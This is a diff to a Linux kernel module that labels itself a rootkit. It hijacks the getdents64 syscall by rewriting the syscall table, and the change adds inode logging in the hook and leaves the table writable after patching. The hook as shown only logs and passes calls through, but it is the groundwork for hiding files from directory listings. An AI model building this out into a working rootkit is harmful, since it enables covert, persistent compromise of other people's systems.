@@ -8,7 +8,7 @@
 #include <asm/unistd.h>
 #include <linux/version.h>
 #include <linux/syscalls.h>
-
+#include <linux/dirent.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("1337");
@@ -20,8 +20,11 @@ unsigned long * sys_call_table;
 asmlinkage int (*real_getdents) (unsigned int, struct linux_dirent*, unsigned int);
 
 asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
-       printk(KERN_INFO "getdents is called through hijacked call.\n");	
-       return real_getdents(fd, dirp, count);
+	printk(KERN_INFO "getdents is called through hijacked call.\n");
+	unsigned long dirent_dino;
+	dirent_dino = dirp->d_ino;
+	printk(KERN_INFO "d_ino:%lu\n",dirent_dino);
+	return real_getdents(fd, dirp, count);
 }
 
 
@@ -48,7 +51,7 @@ void hijack_sys_call_table(){
 	make_rw((unsigned long)sys_call_table);
         real_getdents = (void*)*(sys_call_table + __NR_getdents64);
         *(sys_call_table + __NR_getdents64) = (unsigned long)hijacked_getdents;
-	make_ro((unsigned long)sys_call_table);
+	//make_ro((unsigned long)sys_call_table);
 }
 
 int init_module(void){
@@ -67,8 +70,8 @@ int init_module(void){
 }
 
 void cleanup_module(void){
-      	make_rw((unsigned long)sys_call_table);
-	*(sys_call_table + __NR_getdents) = (unsigned long)real_getdents;
+      	//make_rw((unsigned long)sys_call_table);
+	*(sys_call_table + __NR_getdents64) = (unsigned long)real_getdents;
 	make_ro((unsigned long)sys_call_table);
 	printk(KERN_INFO "Rootkit removed.\n");
 }
